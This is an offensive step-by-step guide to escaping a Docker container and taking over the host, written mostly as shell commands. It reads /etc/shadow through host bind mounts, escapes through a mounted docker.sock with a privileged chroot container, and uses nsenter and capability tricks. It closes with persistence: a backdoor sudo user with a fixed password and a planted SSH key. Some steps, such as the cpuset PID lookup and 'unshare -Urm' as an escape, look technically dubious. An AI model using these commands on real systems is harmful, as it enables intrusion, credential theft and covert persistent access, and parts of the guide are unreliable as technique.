# Accessing the Host System from a Container

## Objective
Escalate from a container to gain access to the host system.

## Steps

### 1. Identify Privileged Containers
Privileged containers have extended capabilities that can help you access the host system.

- **Check for Privileged Containers**:
  ```sh
  docker inspect --format '{{.HostConfig.Privileged}}' <container_id>
  ```

### 2. Exploit Container Misconfigurations

#### Accessing Host File System
- **Bind Mounts**: If the container has bind mounts to the host file system, you can access these paths.
  ```sh
  ls /host
  ```

#### Example: Accessing Host Root Directory
- **Check for Mounted Host Root**:
  ```sh
  ls /host
  ```

- **Access Sensitive Files**:
  ```sh
  cat /host/etc/passwd
  cat /host/etc/shadow
  ```

### 3. Escaping the Container

#### Using Docker Socket
If the Docker socket (`/var/run/docker.sock`) is mounted inside the container, you can interact with the Docker daemon and potentially start a new privileged container.

- **Run a New Privileged Container**:
  ```sh
  docker run -v /:/host --rm -it alpine chroot /host
  ```

#### Using cgroups
If you have access to `cgroups`, you can potentially break out of the container.

- **Find Host PID**:
  ```sh
  host_pid=$(awk -F/ '{print $5}' < /proc/1/cpuset)
  ```

- **Access Host nespace**:
  ```sh
  nsenter --target $host_pid --mount --uts --ipc --net --pid
  ```

### 4. Leverage Capabilities
Containers with certain capabilities can be exploited to access the host.

- **Check Capabilities**:
  ```sh
  capsh --print
  ```

- **Using Capabilities to Break Out**:
  If you have the `CAP_SYS_ADMIN` capability, you might be able to escape to the host.
  ```sh
  unshare -Urm
  ```

### 5. Persistence
Once on the host, maintain access by creating a backdoor or user.

- **Create a User**:
  ```sh
  useradd -m -s /bin/bash newuser
  echo 'newuser:password' | chpasswd
  usermod -aG sudo newuser
  ```

- **Setup SSH Access**:
  ```sh
  mkdir /home/newuser/.ssh
  echo 'ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEArq8w3...' > /home/newuser/.ssh/authorized_keys
  chown -R newuser:newuser /home/newuser/.ssh
  chmod 600 /home/newuser/.ssh/authorized_keys
  ```

## Summary
Accessing the host from a container typically involves exploiting misconfigurations or elevated privileges. Key techniques include leveraging privileged containers, accessing bind mounts, exploiting the Docker socket, and using cgroups or capabilities. Once access is obtained, it is crucial to secure persistence for future access.